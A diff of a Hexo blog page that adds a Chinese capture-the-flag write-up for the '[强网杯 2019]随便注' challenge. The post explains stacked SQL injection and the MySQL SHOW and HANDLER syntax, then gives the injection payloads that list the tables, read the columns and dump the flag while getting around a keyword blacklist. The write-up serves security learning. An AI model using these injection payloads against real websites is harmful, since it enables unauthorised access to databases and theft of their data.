@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>future |  sunset</title>
+      <title>[强网杯 2019]随便注 |  sunset</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-future"
+  id="post-强网杯-2019-随便注"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  future
+  [强网杯 2019]随便注
 </h1>
  
 
@@ -75,15 +75,19 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2023/04/12/future/" class="article-date">
-  <time datetime="2023-04-12T12:17:57.000Z" itemprop="datePublished">2023-04-12</time>
-</a>   
+      <a href="/2023/08/28/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+  <time datetime="2023-08-28T08:26:03.000Z" itemprop="datePublished">2023-08-28</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">-CTF</a>
+  </div>
+  
 <div class="word_count">
     <span class="post-time">
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">4</span>
+            <span class="post-count">1.2k</span>
         </span>
     </span>
 
@@ -92,20 +96,125 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">4 min</span>
         </span>
     </span>
 </div>
  
     </div>
       
+    <div class="tocbot"></div>
+
 
 
 
   
     <div class="article-entry" itemprop="articleBody">
        
-  <p>我的博客</p>
+  <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="堆叠注入介绍"><a href="#堆叠注入介绍" class="headerlink" title="堆叠注入介绍"></a>堆叠注入介绍</h2><h3 id="一、堆叠注入的原理"><a href="#一、堆叠注入的原理" class="headerlink" title="一、堆叠注入的原理"></a>一、堆叠注入的原理</h3><p>sql语句的默认结束符是以分号 “;” 结尾，堆叠注入的原理就是在其过滤和函数使用不当的情况下，利用分号结尾，实现多个sql语句的执行。</p>
+<h3 id="二、堆叠注入触发条件"><a href="#二、堆叠注入触发条件" class="headerlink" title="二、堆叠注入触发条件"></a>二、堆叠注入触发条件</h3><p>堆叠注入触发的条件很苛刻,因为堆叠注入原理就是通过结束符同时执行多条sql语句,这就需要服务器在访问数据端时使用的是可同时执行多条sql语句的方法,比如php中mysqli_multi_query()函数,这个函数在支持同时执行多条sql语句,而与之对应的mysqli_query()函数一次只能执行一条sql语句,所以要想目标存在堆叠注入,在目标主机没有对堆叠注入进行黑名单过滤的情况下必须存在类似于mysqli_multi_query()这样的函数,简单总结下来就是</p>
+<p>1.目标存在sql注入漏洞<br>2.目标未对”;”号进行过滤<br>3.目标中间层查询数据库信息时可同时执行多条sql语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqli_multi_query ( connection, query): 这个函数是用来执行一条或多条由分号分隔的查询语句的。它需要指定要使用的MySQL连接和查询语句两个参数。如果成功，它会返回<span class="literal">true</span>，否则返回<span class="literal">false</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="题中用到的知识"><a href="#题中用到的知识" class="headerlink" title="题中用到的知识"></a>题中用到的知识</h2><h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>show命令是用来显示MySQL数据库中的信息的，比如数据库、表、列、索引等。它不能直接用来查询数据，但是可以用来查看数据的结构或状态。如果你想查询数据，你可以使用select语句，它可以从一个或多个表中选择数据，并可以使用各种条件、聚合函数、分组、排序等功能。select语句的结果是一个结果集，可以用来进一步处理或显示。</p>
+<p>show命令的语法如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> &#123;DATABASES <span class="operator">|</span> SCHEMAS&#125; [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span> <span class="operator">|</span> <span class="keyword">WHERE</span> expr]</span><br><span class="line"><span class="keyword">SHOW</span> [<span class="keyword">FULL</span>] TABLES [&#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; db_name] [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span> <span class="operator">|</span> <span class="keyword">WHERE</span> expr]</span><br><span class="line"><span class="keyword">SHOW</span> [<span class="keyword">FULL</span>] COLUMNS &#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; tbl_name [&#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; db_name] [<span class="keyword">LIKE</span> <span class="string">&#x27;pattern&#x27;</span> <span class="operator">|</span> <span class="keyword">WHERE</span> expr]</span><br><span class="line"><span class="keyword">SHOW</span> INDEX &#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; tbl_name [&#123;<span class="keyword">FROM</span> <span class="operator">|</span> <span class="keyword">IN</span>&#125; db_name]</span><br></pre></td></tr></table></figure>
+
+<p>其中，pattern是一个包含通配符的字符串，expr是一个布尔表达式，FULL是一个可选的修饰符，表示是否显示更多的信息。</p>
+<p>例如，如果你想查看test数据库中的所有表，你可以使用以下命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES <span class="keyword">FROM</span> test;</span><br></pre></td></tr></table></figure>
+
+<p>如果你想查看test数据库中以s开头的表，你可以使用以下命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TABLES <span class="keyword">FROM</span> test <span class="keyword">LIKE</span> <span class="string">&#x27;s%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果你想查看student表中的所有列，你可以使用以下命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> COLUMNS <span class="keyword">FROM</span> student;</span><br></pre></td></tr></table></figure>
+
+<p>如果你想查看student表中的所有索引，你可以使用以下命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> student;</span><br></pre></td></tr></table></figure>
+
+<h4 id="handle"><a href="#handle" class="headerlink" title="handle"></a>handle</h4><p>MySQL中的handler是一种特殊的语法，用于直接访问存储引擎的接口，而不经过SQL解析器和优化器。handler可以用于提高查询性能，尤其是对于大量数据的扫描和插入操作。handler的语法如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name <span class="keyword">OPEN</span> [ [<span class="keyword">AS</span>] alias ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="operator">=</span> <span class="operator">|</span> <span class="operator">&lt;=</span> <span class="operator">|</span> <span class="operator">&gt;=</span> <span class="operator">|</span> <span class="operator">&lt;</span> <span class="operator">|</span> <span class="operator">&gt;</span> &#125; (value1,value2,...) [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; <span class="keyword">FIRST</span> <span class="operator">|</span> NEXT <span class="operator">|</span> PREV <span class="operator">|</span> <span class="keyword">LAST</span> &#125; [ <span class="keyword">WHERE</span> where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name <span class="keyword">CLOSE</span></span><br></pre></td></tr></table></figure>
+
+<p>其中，tbl_name是要操作的表名，index_name是要使用的索引名，value是要比较的值，where_condition是要满足的条件，alias是要给表起的别名。</p>
+<p>例如，如果有一个名为student的表，包含以下列：</p>
+<table>
+<thead>
+<tr>
+<th align="left">id</th>
+<th align="left">name</th>
+<th align="left">age</th>
+<th align="left">gender</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">Tom</td>
+<td align="left">18</td>
+<td align="left">M</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">Lily</td>
+<td align="left">19</td>
+<td align="left">F</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">Jack</td>
+<td align="left">20</td>
+<td align="left">M</td>
+</tr>
+</tbody></table>
+<p>我们可以使用以下handler语句来操作这个表：</p>
+<ul>
+<li>打开student表，并给它起一个别名s：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER student <span class="keyword">OPEN</span> <span class="keyword">AS</span> s;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用id索引，读取id等于2的记录：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER s READ id <span class="operator">=</span> (<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用id索引，读取id大于1的记录，并限制只返回一条：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER s READ id <span class="operator">&gt;</span> (<span class="number">1</span>) LIMIT <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>使用name索引，读取name以L开头的记录，并按照字母顺序排序：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER s READ name <span class="keyword">FIRST</span> <span class="keyword">WHERE</span> name <span class="keyword">LIKE</span> <span class="string">&#x27;L%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>关闭student表：</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLER s <span class="keyword">CLOSE</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>读取表中的数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler 别名 read next;（将句柄移动到表中的第一行数据并且读取，也可以用<span class="keyword">first</span>或者<span class="keyword">last</span>读取第一行和最后一行）</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://cdn.jsdelivr.net/gh/sunsetdream/future/image-20230828162742934.png"></p>
+<p>首先判断的是闭合符，经测试闭合符为’’</p>
+<p>用select查询数据时候发现，被过滤了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,<span class="variable">$inject</span>);</span><br></pre></td></tr></table></figure>
+
+<p>构造出</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span><span class="string">&#x27;;show tables;</span></span><br></pre></td></tr></table></figure>
+
+<p>发现这个库中有 1919810931114514 和 words 两张表</p>
+<p>然后利用show查看一下表的结构 ，需要注意的是，由于 1919810931114514 表的名字为数字，需要用反引号包裹住才能查询 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;SHOW COLUMNS FROM `1919810931114514`;</span><br></pre></td></tr></table></figure>
+
+<p>发现字段中含有flag</p>
+<p>利用handle函数，具体查询数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=1&#x27;;HANDLER `1919810931114514` OPEN AS s;handler s read next;</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p>参考博客： <a target="_blank" rel="noopener" href="http://t.csdn.cn/VbpwK">http://t.csdn.cn/VbpwK</a></p>
  
       <!-- reward -->
       
@@ -176,7 +285,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/04/12/future/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/08/28/%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -187,19 +296,10 @@
    
   <nav class="article-nav">
     
-      <a href="/2023/04/12/disable_function/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            disable_function
-          
-        </div>
-      </a>
     
-    
-      <a href="/2023/04/12/web/" class="article-nav-link">
+      <a href="/2023/08/21/UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ezpop/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">正则绕过</div>
+        <div class="article-nav-title">[UUCTF 2022 新生赛]ezpop</div>
       </a>
     
   </nav>
